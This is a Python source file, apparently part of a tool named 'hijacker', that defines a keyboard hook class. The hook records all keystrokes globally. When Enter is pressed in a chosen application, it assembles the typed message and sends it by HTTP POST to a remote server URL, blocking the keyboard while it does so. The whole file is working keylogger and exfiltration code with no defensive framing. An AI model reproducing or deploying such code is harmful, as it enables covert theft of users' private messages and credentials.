import logging
import threading
from time import sleep
from typing import Optional
import requests

import keyboard as kb

from src.client.process import get_foreground_process

logger = logging.getLogger("hijacker.app")

event_history: list[kb.KeyboardEvent] = []


class HijackerHook:
    def __init__(self, server_url: str, process_name: str):
        self.server_url = server_url
        self.process_name = process_name
        self.block_keyboard = False
        self.event_history: list[kb.KeyboardEvent] = []

    def hook(self, event: kb.KeyboardEvent) -> Optional[bool]:
        if event.name == 'esc':  # Emergency Exit
            return True
        elif self.block_keyboard:
            return False

        fg_proc = get_foreground_process()
        if fg_proc.name() != self.process_name or event.name != 'enter':
            event_history.append(event)
            logger.debug(f"Event appended to Event History: {event.name}")
            return True

        # Process the typed message
        message = "".join([s for s in kb.get_typed_strings(event_history) if s])
        logger.info(f"Hijacked message: {message}")

        threading.Thread(target=self.block_and_send, args=(message, "enter"), daemon=True).start()
        event_history.clear()

        sleep(0.1)

    def block_and_send(self, message: str, key: str, tries: int = 3):
        self.block_keyboard = True

        data = {
            "message": message
        }
        for i in range(tries):
            response = requests.post(self.server_url, json=data)
            if response.status_code == 200:
                logger.info("Message hijacked successfully.")
                break
            else:
                logger.error(f"Failed to send hijack message. Response: {data}")

        sleep(1)
        self.block_keyboard = False
        kb.press_and_release(key)
        logger.debug(f"Keyboard unblocked and key {key} pressed.")
